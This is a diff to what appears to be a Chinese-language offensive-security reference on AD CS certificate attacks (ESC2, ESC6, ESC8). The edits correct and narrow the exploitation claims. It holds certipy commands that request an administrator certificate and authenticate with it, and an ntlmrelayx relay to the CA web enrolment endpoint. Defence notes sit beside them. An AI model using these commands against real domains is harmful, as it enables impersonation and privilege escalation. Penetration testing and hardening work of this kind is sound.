@@ -18,7 +18,7 @@ _利用ESC2模板配置错误_
 _platform: linux_
 ```
 certipy find -u user@domain.com -p password -dc-ip DC_IP
-查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
+查找 Any Purpose 或无 EKU 的模板；Enrollee Supplies Subject 属于 ESC1 条件，不等同 ESC2。
 ```
 
 **请求证书**
@@ -40,11 +40,11 @@ certipy auth -pfx administrator.pfx -dc-ip DC_IP
 ```
 
 
-**概述：** ESC2允许请求任意用途的证书，可用于伪造任意用户身份。
+**概述：** ESC2 是 Any Purpose/无 EKU 模板；仅有该设置不保证能直接以任意 UPN 冒充他人。通常还需可用的代理注册目标模板等条件。
 
 **漏洞原理：** 证书模板配置允许Any Purpose扩展。
 
-**利用方法：** 利用流程：1) 发现ESC2模板 2) 请求管理员证书 3) 使用证书认证
+**利用方法：** 先检查 EKU、注册权限和代理注册目标模板；上面的直接 -upn 片段不能单独证明 ESC2 可利用。
 
 **防御措施：** 防御措施：1) 审计证书模板 2) 禁用Any Purpose 3) 监控证书请求
 
@@ -140,7 +140,7 @@ certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMP
 _platform: linux_
 ```
 certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
-恢复原配置避免检测
+恢复原配置并保留变更/恢复审计记录
 ```
 
 
@@ -177,11 +177,11 @@ certipy find -u user@domain.com -p password -dc-ip DC_IP
 > 请求管理员证书
 _platform: linux_
 ```
-certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
-使用-alt参数指定SAN
+certipy req -u user@domain.com -p password -ca CA_NAME -template User -upn administrator@domain.com
+使用固定版本支持的 -upn 参数指定 UPN；单独指定 UPN 不保证通过强证书映射。
 ```
 **语法解析：**
-- `-alt` — 指定Subject Alternative Name _parameter_
+- `-upn` — 指定 UPN _parameter_
 - `EDITF_ATTRIBUTESUBJECTALTNAME2` — CA允许在请求中指定SAN _keyword_
 
 **使用证书认证**
@@ -196,7 +196,7 @@ certipy auth -pfx administrator.pfx -dc-ip DC_IP
 
 **漏洞原理：** CA配置了EDITF_ATTRIBUTESUBJECTALTNAME2标志。
 
-**利用方法：** 利用流程：1) 探测CA配置 2) 请求带管理员SAN的证书 3) 认证
+**利用边界：** 在已修补环境中，ESC6 单独通常不足以提权；必须核对 SID 安全扩展、证书映射和额外模板/CA 条件。不要将发证成功写成管理员认证成功。
 
 **防御措施：** 防御措施：1) 移除EDITF_ATTRIBUTESUBJECTALTNAME2标志 2) 监控证书请求 3) 审计CA配置
 
@@ -245,7 +245,7 @@ impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
 
 **概述：** ESC8利用ADCS HTTP端点进行NTLM中继攻击。
 
-**漏洞原理：** ADCS HTTP端点支持NTLM认证且未启用签名。
+**漏洞原理：** ADCS Web 注册接受 NTLM 且缺少有效 EPA/通道绑定等保护；HTTPS 本身也不保证阻止中继。
 
 **利用方法：** 利用流程：1) 设置中继服务器 2) 触发目标认证 3) 获取证书
 
